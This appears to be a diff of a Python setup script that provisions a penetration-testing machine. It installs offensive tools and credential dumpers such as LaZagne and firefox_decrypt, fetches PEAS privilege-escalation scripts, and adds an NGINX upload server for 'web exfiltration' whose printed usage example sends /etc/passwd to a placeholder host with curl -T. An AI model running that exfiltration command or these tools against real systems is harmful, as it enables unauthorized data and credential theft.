@@ -1,51 +1,7 @@
-import os,re,time
+import argparse,os,re,time
 from simple_term_menu import TerminalMenu
 from termcolor import colored
-
-
-APT_PACKAGES = [
-	'apt-transport-https',
-	'bloodhound',
-	'chromium',
-	'crackmapexec',
-	'enum4linux',
-	'gobuster',
-	'golang-go',
-	'jxplorer',
-	'metasploit-framework',
-	'remmina',
-	'seclists',
-	'smbmap',
-	'snmpcheck',
-	'sshoot',
-	'sshuttle',
-	'subfinder',
-	'sublime-text',
-	'tilix',
-	'wfuzz',
-	'xfreerdp',
-	'yersinia'
-]
-
-#TODO: Alphabetize
-GITHUBS = [
-   'https://github.com/0v3rride/Enum4LinuxPy.git',
-	'https://github.com/21y4d/nmapAutomator.git',
-	'https://github.com/BishopFox/rmiscout.git',
-	'https://github.com/cnotin/SplunkWhisperer2',
-	'https://github.com/frohoff/ysoserial.git',
-	'https://github.com/GhostPack/Seatbelt',
-	'https://github.com/HackPlayers/evil-winrm.git',
-	'https://github.com/n0b0dyCN/redis-rogue-server.git',
-	'https://github.com/nccgroup/vlan-hopping.git',
-	'https://github.com/NickstaDB/BaRMIe.git',
-	'https://github.com/p3nt4/Invoke-SocksProxy'
-	'https://github.com/rebootuser/LinEnum.git',
-	'https://github.com/RUB-NDS/PRET.git',
-	'https://github.com/SecureAuthCorp/Impacket.git',
-	'https://github.com/sosdave/KeyTabExtract',
-	'https://github.com/vulnersCom/nmap-vulners.git'
-]
+from tools import APT_PACKAGES,GITHUBS,PYPI_PACKAGES
 
 #Kerbrute releases
 # https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
@@ -54,17 +10,21 @@ GITHUBS = [
 #pspy release
 #https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 
-PYPI_PACKAGES = [
-	'one-lin3r',
-	'pypykatz',
-	'pygtk',
-	'ptftpd',
-	'bloodhound',
-	'colorama',
-	'pysnmp'
-]
 
 # ---- Begin Function declarations -----
+
+def nginx_config():
+	# Used to create an NGINX proxy for apache for web exfiltration 
+	os.system("sudo mkdir -p /var/www/uploads/Exfil")
+	os.system("sudo chown -R www-data:www-data /var/www/uploads/Exfil")
+	os.system("sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf")
+	os.system("sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/")
+	os.system("sudo systemctl restart nginx.service")
+	os.system("sudo rm /etc/nginx/sites-enabled/default")
+	# Usage
+	print(colored("NGINX has been setup. To test the upload, try:","green"))
+	print(colored("curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/upload/Exfil/testfile.txt \n", "green"))
+
 
 def env_setup():
 	""" This is meant to start services, check running processes, etc """
@@ -94,6 +54,8 @@ def msfdb_init():
 	os.system('systemctl status postgresql')
 	os.system('sudo msfdb init')
 	print("MSF Database Initialized")
+	print("Creating msfconsole.rc file")
+	os.system(f' cp ./msfconsole.rc /home/kali/.msf4/msfconsole.rc') #This currently doesn't work due to the dirs switching around
 
 #Consider moving into environment setup
 def neo4j_init():
@@ -105,22 +67,26 @@ def neo4j_init():
 
 #TODO: Do this better
 #TODO: Fix it so that the proper lower-level user owns the files
+
+# This whole PEAS mess needs to be fixed later
 def peas_download():
-	linpeas_sh = 'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh'
-	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEAS.bat'
-	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEASany.exe'
-	def grab_peas():
-		os.mkdir(f"/opt/PEAS")
-		os.system(f"wget {linpeas_sh} -qO /opt/PEAS/linpeas.sh && chmod +x /opt/PEAS/linpeas.sh")
-		os.system(f"wget {winpeas_bat} -qO /opt/PEAS/winpeas.bat")
-		os.system(f"wget {winpeas_exe} -qO /opt/PEAS/winpeas.exe")
 	# For the time being - just scrub the PEAS directory and re-obtain
-	if os.path.exists("/opt/PEAS"):
+	if os.path.exists("./PEAS"):
 		#Lol, risky
-		os.system("rm -rf /opt/PEAS")
+		os.system("sudo rm -rf ./PEAS")
 		grab_peas()
 	else:
 		grab_peas()
+
+def grab_peas():
+	linpeas_sh = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/linpeas.sh'
+	winpeas_bat = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEAS.bat'
+	winpeas_exe = 'https://github.com/carlospolop/PEASS-ng/releases/download/20221009/winPEASany.exe'
+	os.system(f"sudo mkdir ./PEAS")
+	os.system(f"sudo wget {linpeas_sh} -qO ./PEAS/linpeas.sh ; sudo chmod +x ./PEAS/linpeas.sh")
+	os.system(f"sudo wget {winpeas_bat} -qO ./PEAS/winpeas.bat")
+	os.system(f"sudo wget {winpeas_exe} -qO ./PEAS/winpeas.exe")
+
 
 
 def shell_creation():
@@ -140,10 +106,17 @@ def shell_creation():
 # sudo ln -s /opt/LinEnum.sh /usr/local/bin/'
 # sudo ln -s /opt/.local/bin/one-lin3r /usr/local/bin
 def tool_install():
-
+	#Temp method to grab lazagne and the old firefox decrypt for python2
+	lazagne_exe = 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
+	os.system(f"sudo wget {lazagne_exe} -qO ./lazagne.exe")
+	ff_decrypt_old = 'https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip'
+	os.system(f"sudo wget {ff_decrypt_old} -qO ./FirefoxDecrypt_ForPython2")
+	
+	#### END TEMP METHOD
+	
 	def is_repo_installed(repo_url):
 		if a_match := re.match(r"https://.+/(.+)\.git", repo_url):
-			return os.path.exists(f"/opt/{a_match.group(1)}")
+			return os.path.exists(f"./{a_match.group(1)}")
 		else:
 			print(colored(f'INVALID URL: {repo_url}', 'red'))
 			# Returning True here because if the url isn't valid, then we definitely don't want to try installing
@@ -152,7 +125,7 @@ def tool_install():
 	for git_url in GITHUBS:
 		print(f"Checking for local install of: {git_url}")
 		if is_repo_installed(git_url):
-			print(colored(f"Found in /opt continuing...\n"))
+			print(colored(f"Found in current directory, continuing...\n"))
 		else:
 			os.system(f"git clone {git_url}")
 			print(colored("Repo cloned! Moving on...\n", "green"))
@@ -167,14 +140,14 @@ def tool_install():
 		os.system(f'pip3 install {pkg} 1>/dev/null')
 		print(colored(f'PYPI {pkg} successfully installed by script', "green"))
 	peas_download()
-	os.system("ln -s /opt/nmapAutomator/nmapAutomator.sh /usr/local/bin/ && chmod +x /opt/nmapAutomator/nmapAutomator.sh")
+	os.system("sudo ln -s ./nmapAutomator/nmapAutomator.sh /usr/local/bin/ && chmod +x ./nmapAutomator/nmapAutomator.sh")
 	print("tool_install() Completed")
 	return True
 
 
 def sublime_download():
 	sublime = 'deb https://download.sublimetext.com/ apt/stable/'
-	os.system('wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg\
+	os.system('sudo wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg\
 				| sudo apt-key add -')
 	os.system(f'echo {sublime} | sudo tee /etc/apt/sources.list.d/sublime-text.list')
 
@@ -211,6 +184,7 @@ def terminal_selection():
 	# Choice menu
 	if menu_entry_index == 0:
 		print(("Match Successful on ALL"))
+		nginx_config()
 		system_update()
 		msfdb_init()
 		neo4j_init()
@@ -218,6 +192,7 @@ def terminal_selection():
 	elif menu_entry_index == 1:
 		print("Match successful on TOOLS")
 		#software_update()
+		nginx_config()
 		tool_install()
 		tool_update()
 		msfdb_init()
@@ -233,9 +208,10 @@ def terminal_selection():
 		print("Match failed.")
 
 def test():
-	peas_download()
+	#peas_download()
 	print(os.getlogin()) # Interestingly enough - this returns the actual user
 	print(os.system("whoami")) # This returns as root (since it's run as sudo)
+	print("Test Successful!")
 	return()
 
 def jon():
